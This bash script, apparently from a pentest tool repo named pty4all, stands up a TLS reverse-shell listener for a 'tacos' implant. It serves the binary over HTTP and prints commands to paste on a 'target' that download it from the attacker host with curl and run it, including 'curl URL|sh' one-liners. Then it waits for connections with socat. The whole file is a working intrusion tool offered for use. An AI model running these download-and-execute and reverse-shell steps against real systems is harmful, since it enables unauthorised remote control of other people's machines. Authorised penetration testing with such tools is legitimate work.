#!/bin/bash

# From https://github.com/laluka/pty4all
SHORTCUT=true

for i in "$@"; do
    case $i in
    --lport|-p)
        LPORT="$2"
        shift;shift;
        ;;
    --lhost)
        LHOST="$2"
        shift;shift;
        ;;
    --webport)
        WEBPORT="$2"
        shift;shift;
        ;;        
    --gitar|-g)
        GITAR=true
        ;;
    --windows|-w)
        WINDOWS=true
        ;;
    --tmp)
        TACOS_IN_TMP=true
        ;;
    --no-shortcuts|-N)
        SHORTCUT="" # ~ setting at false
        ;;
    *)    
        ;;
    esac
done

# Default value + envvar

SCRIPTNAME=$(readlink -f "$0")
BASEDIR=$(dirname "$SCRIPTNAME")


if [[ -z "$WEBPORT" ]];
then
    WEBPORT=8080
fi

if [[ -z "$LHOST" ]] || [[ -z "$LPORT" ]];
then
    echo "Usage : $0 --lhost <LHOST> --lport <LPORT> --webport <WEB_PORT>"
    echo "to preload gitar shortcuts within reverse shell: $0 --lhost <LHOST> --lport <LPORT> --gitar"
    exit 92
fi

if [[ -z "${TMUX}" ]]; then
    echo "Must be run in tmux"
    exit 92
fi

if [[ "$WINDOWS" ]]; then
    BINARY="tacos.exe"
    SCRIPT=$BASEDIR"/socat-forker-windows.sh"
else
    BINARY="tacos"
    SCRIPT=$BASEDIR"/socat-forker.sh"
fi

# TLS part
echo -e "\n\n\n[+] Generating tls certs and keys"
if [ -f server.pem ]; then
    echo "[+] Files already exist, using server.pem"
else
    rm server.key server.crt server.pem
    yes "" | openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt
    cat server.key server.crt >server.pem
fi

cp ${SCRIPT}.tpl ${SCRIPT}

# HTTP server launch
if [[ "$GITAR" ]]; then
    echo "[+] launch gitar server"
    SECRET=$RANDOM
    tmux split-window -h "gitar -e ${LHOST} -p ${WEBPORT} --secret ${SECRET}"
    ## Load gitar shortcuts (gitar shortcut is not available with windows, in fact --dry-run is,not yet implemented)
    if [[ ! $WINDOWS ]]; then
        echo "[+] gitar shortcuts enabled on reverse shell"
        sed -i "s/GITAR_SECRET/${SECRET}/g" ${SCRIPT}
        sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
        sed -i "s/GITAR_HOST/${LHOST}/g" ${SCRIPT}
    fi
else
    echo "[+] gitar shortcuts  not enabled"
    tmux split-window -h "python3 -m http.server ${WEBPORT}"
    # disable gitar shortcut
    sed -i "/GITAR_SECRET/d" ${SCRIPT}
fi

# put tacos in current directory
PWD=$(pwd)
if [[ -f "./$BINARY" ]];then
    echo "[+] ${BINARY} is already in ${PWD}"
else
    RED='\033[1;31m'
    NC='\033[0m' # No Color
    printf "${RED}[+] Put ${BINARY} in ${PWD} before launching reverse shell process${NC}\n"

fi

# Message/output
echo "[*] Copy/paste following command on target and enjoy your meal 🌮:"
DOWNLOAD_URL=""
if [[ "$GITAR" ]]; then
    DOWNLOAD_URL="http://${LHOST}:${WEBPORT}/${SECRET}/pull/${BINARY}"
else
    DOWNLOAD_URL="${LHOST}:${WEBPORT}/${BINARY}"
fi


# LISTEN
REMOTE_CMD=""

if [[ "$WINDOWS" ]]; then
    REMOTE_CMD="curl -O $DOWNLOAD_URL && .\\${BINARY} ${LHOST}:${LPORT}"
else
    REMOTE_CMD="curl -s -O $DOWNLOAD_URL && chmod +x ${BINARY} && ./${BINARY} ${LHOST}:${LPORT}"
    ## Sometimes RCE is not in a writable directory
    if [[ "$TACOS_IN_TMP" ]]; then
        REMOTE_CMD="mkdir -p /tmp/tacos && curl -s -o /tmp/tacos/${BINARY} $DOWNLOAD_URL && chmod +x /tmp/tacos/${BINARY} && /tmp/tacos/${BINARY} ${LHOST}:${LPORT}"
    fi
fi

## with shorter shortcut?
if [[ "$SHORTCUT" ]]; then
    ## Write file for gitar
    echo "${REMOTE_CMD}" > sh
    SHORTCUT_URL="http://${LHOST}:${WEBPORT}"
    if [[ "$GITAR" ]]; then
        SHORTCUT_URL="${SHORTCUT_URL}/${SECRET}/pull/sh"
    else
        SHORTCUT_URL="${SHORTCUT_URL}/sh"
    fi
    REMOTE_CMD="\nsh -c \"\$(curl ${SHORTCUT_URL})\"\nsh <(curl ${SHORTCUT_URL})\ncurl ${SHORTCUT_URL}|sh\n"
    ## curl ${SHORTCUT_URL} |sh\n work but trigger error (/pkg/tacos/tacos.go:94)
    # sh <() only work in zsh & bash
fi

echo
if [[ "$WINDOWS" ]]; then
    echo -e "(🪟) ${REMOTE_CMD}"
    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty
else
    echo -e "(🐧) ${REMOTE_CMD}"
    socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:${SCRIPT},pty,raw,echo=0
fi
